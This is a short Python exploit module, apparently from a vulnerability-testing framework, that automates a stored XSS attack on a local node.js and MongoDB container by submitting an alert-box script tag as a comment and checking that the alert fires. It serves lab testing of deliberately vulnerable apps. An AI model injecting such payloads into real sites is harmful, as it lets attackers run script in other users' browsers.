from data.exploits.framework.BasicExploit import BasicExploit

class Exploit(BasicExploit):

    attributes = {
      'Name' :        'StoredXSSExploit',
      'Description' : "Example of stored XSS injection in MongoDB + node.js",
      'References' :  [["empty"]],
      'Target' :      "xssstored",
      'Container': 'ubuntu-node-mongo',
      'TargetLicense' : '',
      'Plugin' : '',
      'VulWikiPage' : "None",
      'Type' : 'Stored XSS'
    }

    def runExploit(self):
        wrapper = self.wrapper
        wrapper.navigate("http://localhost:49160/comments.html")
        wrapper.find("newComment").keys("<script>alert(\"XSS\")</script>")
        wrapper.find("submitBtn").click()
        alert_text = wrapper.handle_alert()
        self.assertIn("XSS", alert_text, "Exploit didn't work!")
